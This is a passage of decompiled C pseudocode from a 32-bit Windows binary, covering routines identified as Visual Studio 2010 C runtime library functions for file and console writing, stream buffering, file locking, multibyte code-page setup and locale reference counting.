        pWVar10 = local_1abc;
        do {
          if (_MaxCharCount <= uVar12) break;
          WVar3 = *pWVar13;
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          uVar12 = uVar12 + 1;
          if ((char)WVar3 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar10 = '\r';
            pWVar10 = (WCHAR *)((int)pWVar10 + 1);
            uVar14 = uVar14 + 1;
          }
          *(char *)pWVar10 = (char)WVar3;
          pWVar10 = (WCHAR *)((int)pWVar10 + 1);
          uVar14 = uVar14 + 1;
          local_1ae4 = pWVar13;
        } while (uVar14 < 0x13ff);
        BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                          (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
        if (BVar9 == 0) goto LAB_0040d3f1;
        local_1acc = local_1acc + local_1adc;
      } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
              ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_0040d3fd;
    }
    if (local_1ac5 == '\x02') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)pWVar13 - (int)local_1ad0;
          pWVar10 = local_1abc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar3 = *pWVar13;
            pWVar13 = pWVar13 + 1;
            uVar12 = uVar12 + 2;
            if (WVar3 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar10 = L'\r';
              pWVar10 = pWVar10 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar10 = WVar3;
            pWVar10 = pWVar10 + 1;
            local_1ae4 = pWVar13;
          } while (local_1ac4 < 0x13fe);
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                            (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_0040d3f1;
          local_1acc = local_1acc + local_1adc;
        } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
                ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_0040d3fd;
      }
    }
    else {
      local_1ad8 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)local_1ad8 - (int)local_1ad0;
          pWVar13 = local_6bc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar3 = *local_1ad8;
            local_1ad8 = local_1ad8 + 1;
            uVar12 = uVar12 + 2;
            if (WVar3 == L'\n') {
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar13 = WVar3;
            pWVar13 = pWVar13 + 1;
          } while (local_1ac4 < 0x6a8);
          iVar15 = 0;
          iVar7 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar13 - (int)local_6bc) / 2,
                                      local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar7 == 0) goto LAB_0040d3f1;
          do {
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1414 + iVar15,iVar7 - iVar15,
                              &local_1adc,(LPOVERLAPPED)0x0);
            if (BVar9 == 0) {
              local_1ac0 = GetLastError();
              break;
            }
            iVar15 = iVar15 + local_1adc;
          } while (iVar15 < iVar7);
        } while ((iVar7 <= iVar15) &&
                (local_1acc = (int)local_1ad8 - (int)local_1ad0, local_1acc < _MaxCharCount));
        goto LAB_0040d3fd;
      }
    }
  }
  else {
    p_Var8 = __getptd();
    pwVar2 = p_Var8->ptlocinfo->lc_category[0].wlocale;
    BVar9 = GetConsoleMode(*(HANDLE *)(iVar11 + *piVar6),(LPDWORD)&local_1ae4);
    if ((BVar9 == 0) || ((pwVar2 == (wchar_t *)0x0 && (local_1ac5 == '\0')))) goto LAB_0040d110;
    local_1ae4 = (WCHAR *)GetConsoleCP();
    local_1ad8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac4 = 0;
      pWVar13 = local_1ad0;
      do {
        piVar6 = local_1ae0;
        if (local_1ac5 == '\0') {
          cVar1 = (char)*pWVar13;
          local_1ae8 = (uint)(cVar1 == '\n');
          iVar7 = *local_1ae0 + iVar11;
          if (*(int *)(iVar7 + 0x38) == 0) {
            iVar7 = _isleadbyte(CONCAT22(cVar1 >> 7,(short)cVar1));
            if (iVar7 == 0) {
              uVar16 = 1;
              pWVar10 = pWVar13;
              goto LAB_0040cf77;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar13)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(char *)(iVar11 + 0x34 + *piVar6) = (char)*pWVar13;
              *(undefined4 *)(iVar11 + 0x38 + *piVar6) = 1;
              break;
            }
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar13,2);
            if (iVar7 == -1) break;
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_1ac4 = local_1ac4 + 1;
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar7 + 0x34);
            *(undefined4 *)(iVar7 + 0x38) = 0;
            uVar16 = 2;
            pWVar10 = &local_10;
            local_10._1_1_ = cVar1;
LAB_0040cf77:
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar10,(uint)uVar16);
            if (iVar7 == -1) break;
          }
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_1ac4 = local_1ac4 + 1;
          nNumberOfBytesToWrite =
               WideCharToMultiByte((UINT)local_1ae4,0,(LPCWSTR)&local_1ac0,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_0040d3f1;
          local_1acc = local_1ac4 + local_1ad4;
          if ((int)local_1ad8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae8 != 0) {
            local_10._0_1_ = '\r';
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,1,(LPDWORD)&local_1ad8,
                              (LPOVERLAPPED)0x0);
            if (BVar9 == 0) goto LAB_0040d3f1;
            if ((int)local_1ad8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            local_1ac0 = (DWORD)(ushort)*pWVar13;
            local_1ae8 = (uint)(local_1ac0 == 10);
            pWVar13 = pWVar13 + 1;
            local_1ac4 = local_1ac4 + 2;
          }
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            wVar4 = __putwch_nolock((wchar_t)local_1ac0);
            if (wVar4 != (wchar_t)local_1ac0) goto LAB_0040d3f1;
            local_1acc = local_1acc + 2;
            if (local_1ae8 != 0) {
              local_1ac0 = 0xd;
              wVar4 = __putwch_nolock(L'\r');
              if (wVar4 != (wchar_t)local_1ac0) goto LAB_0040d3f1;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac4 < _MaxCharCount);
      goto LAB_0040d3fd;
    }
LAB_0040d406:
    if (local_1ac0 != 0) {
      if (local_1ac0 == 5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        __dosmaperr(local_1ac0);
      }
      goto LAB_0040d47f;
    }
  }
LAB_0040d43c:
  if (((*(byte *)(iVar11 + 4 + *local_1ae0) & 0x40) == 0) || ((char)*local_1ad0 != '\x1a')) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
  }
LAB_0040d47f:
  iVar11 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar11;
}



/* Function: __write */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __write
   
   Library: Visual Studio 2010 Release */

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0040d559();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004087f3();
  }
  return -1;
}



/* Function: FUN_0040d559 */

void FUN_0040d559(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



/* Function: __getbuf */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __getbuf
   
   Library: Visual Studio 2010 Release */

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_0041b908 = _DAT_0041b908 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



/* Function: __isatty */

/* Library Function - Single Match
    __isatty
   
   Library: Visual Studio 2010 Release */

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      return (int)*(char *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
             0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004087f3();
  }
  return 0;
}



/* Function: FUN_0040d600 */

undefined ** FUN_0040d600(void)

{
  return &PTR_DAT_004194a0;
}



/* Function: __lock_file */

/* Library Function - Single Match
    __lock_file
   
   Library: Visual Studio 2010 Release */

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_004194a0) || ((FILE *)&DAT_00419700 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)(_File + -0x20ca5) >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



/* Function: __lock_file2 */

/* Library Function - Single Match
    __lock_file2
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



/* Function: __unlock_file */

/* Library Function - Single Match
    __unlock_file
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release */

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x41949f < _File) && (_File < (FILE *)0x419701)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040c0a7(((int)(_File + -0x20ca5) >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



/* Function: __unlock_file2 */

/* Library Function - Single Match
    __unlock_file2
   
   Library: Visual Studio 2010 Release */

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040c0a7(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



/* Function: __fileno */

/* Library Function - Single Match
    __fileno
   
   Library: Visual Studio 2010 Release */

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    return -1;
  }
  return _File->_file;
}



/* Function: CPtoLCID */

/* Library Function - Single Match
    int __cdecl CPtoLCID(int)
   
   Library: Visual Studio 2010 Release */

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



/* Function: setSBCS */

/* Library Function - Single Match
    void __cdecl setSBCS(struct threadmbcinfostruct *)
   
   Library: Visual Studio 2010 Release */

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined1 *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined1 *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_00419720 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined1 *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00419720 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



/* Function: setSBUpLow */

/* Library Function - Single Match
    void __cdecl setSBUpLow(struct threadmbcinfostruct *)
   
   Library: Visual Studio 2010 Release */

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_0040d9e4:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_0040d9e4;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0040d987;
        }
        *(undefined1 *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0040d987:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: ___updatetmbcinfo */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___updatetmbcinfo
   
   Library: Visual Studio 2010 Release */

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00419c40) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_00419b48) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_00419720)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_00419b48;
      lpAddend = (pthreadmbcinfo)PTR_DAT_00419b48;
      InterlockedIncrement((LONG *)PTR_DAT_00419b48);
    }
    FUN_0040da99();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



/* Function: FUN_0040da99 */

void FUN_0040da99(void)

{
  FUN_0040c0a7(0xd);
  return;
}



/* Function: getSystemCP */

/* Library Function - Single Match
    int __cdecl getSystemCP(int)
   
   Library: Visual Studio 2010 Release */

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_0041b90c = 0;
  if (unaff_ESI == -2) {
    DAT_0041b90c = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_0041b90c = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_0041b90c = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_0041b90c = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



/* Function: __setmbcp_nolock */

/* Library Function - Single Match
    __setmbcp_nolock
   
   Library: Visual Studio 2010 Release */

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_0040db5c:
    if (*(uint *)((int)&DAT_00419b50 + uVar5) != uVar4) goto code_r0x0040db68;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_00419b60 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | *(byte *)(local_24 + 0x419b4c);
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_00419b54 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0040dc90;
  }
LAB_0040db49:
  setSBCS(unaff_EDI);
LAB_0040dcf8:
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0040db68:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x0040db75;
  goto LAB_0040db5c;
code_r0x0040db75:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_0040dcf8;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_0040dc90:
    setSBUpLow(unaff_EDI);
    goto LAB_0040dcf8;
  }
  if (DAT_0041b90c == 0) goto LAB_0040dcf8;
  goto LAB_0040db49;
}



/* Function: FUN_0040dd07 */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_0040dd07(void)

{
  _ptiddata p_Var1;
  pthreadmbcinfo ptVar2;
  LONG LVar3;
  int *piVar4;
  int iVar5;
  pthreadmbcinfo ptVar6;
  pthreadmbcinfo ptVar7;
  int iStack00000004;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar2 = p_Var1->ptmbcinfo;
  iStack00000004 = getSystemCP(in_stack_ffffffc8);
  if (iStack00000004 == ptVar2->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar2 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar2 != (pthreadmbcinfo)0x0) {
      ptVar6 = p_Var1->ptmbcinfo;
      ptVar7 = ptVar2;
      for (iVar5 = 0x88; iVar5 != 0; iVar5 = iVar5 + -1) {
        ptVar7->refcount = ptVar6->refcount;
        ptVar6 = (pthreadmbcinfo)&ptVar6->mbcodepage;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
      }
      ptVar2->refcount = 0;
      local_24 = __setmbcp_nolock(iStack00000004,(int)ptVar2);
      if (local_24 == 0) {
        LVar3 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar3 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_00419720)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar2;
        InterlockedIncrement((LONG *)ptVar2);
        if (((p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00419c40 & 1) == 0)) {
          __lock(0xd);
          _DAT_0041b91c = ptVar2->mbcodepage;
          _DAT_0041b920 = ptVar2->ismbcodepage;
          _DAT_0041b924 = *(undefined4 *)ptVar2->mbulinfo;
          for (iVar5 = 0; iVar5 < 5; iVar5 = iVar5 + 1) {
            (&DAT_0041b910)[iVar5] = ptVar2->mbulinfo[iVar5 + 2];
          }
          for (iVar5 = 0; iVar5 < 0x101; iVar5 = iVar5 + 1) {
            (&DAT_00419940)[iVar5] = ptVar2->mbctype[iVar5 + 4];
          }
          for (iVar5 = 0; iVar5 < 0x100; iVar5 = iVar5 + 1) {
            (&DAT_00419a48)[iVar5] = ptVar2->mbcasemap[iVar5 + 4];
          }
          LVar3 = InterlockedDecrement((LONG *)PTR_DAT_00419b48);
          if ((LVar3 == 0) && (PTR_DAT_00419b48 != &DAT_00419720)) {
            _free(PTR_DAT_00419b48);
          }
          PTR_DAT_00419b48 = (undefined *)ptVar2;
          InterlockedIncrement((LONG *)ptVar2);
          FUN_0040de68();
        }
      }
      else if (local_24 == -1) {
        if (ptVar2 != (pthreadmbcinfo)&DAT_00419720) {
          _free(ptVar2);
        }
        piVar4 = __errno();
        *piVar4 = 0x16;
      }
    }
  }
  return local_24;
}



/* Function: FUN_0040de68 */

void FUN_0040de68(void)

{
  FUN_0040c0a7(0xd);
  return;
}



/* Function: ___addlocaleref */

/* Library Function - Single Match
    ___addlocaleref
   
   Library: Visual Studio 2010 Release */

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG *pLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  pLVar2 = param_1 + 0x14;
  param_1 = (LONG *)0x6;
  do {
    if (((undefined *)pLVar2[-2] != &DAT_00419c44) && ((LONG *)*pLVar2 != (LONG *)0x0)) {
      InterlockedIncrement((LONG *)*pLVar2);
    }
    if ((pLVar2[-1] != 0) && ((LONG *)pLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement((LONG *)pLVar2[1]);
    }
    pLVar2 = pLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



/* Function: ___removelocaleref */

/* Library Function - Single Match
    ___removelocaleref
   
   Library: Visual Studio 2010 Release */

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG *pLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
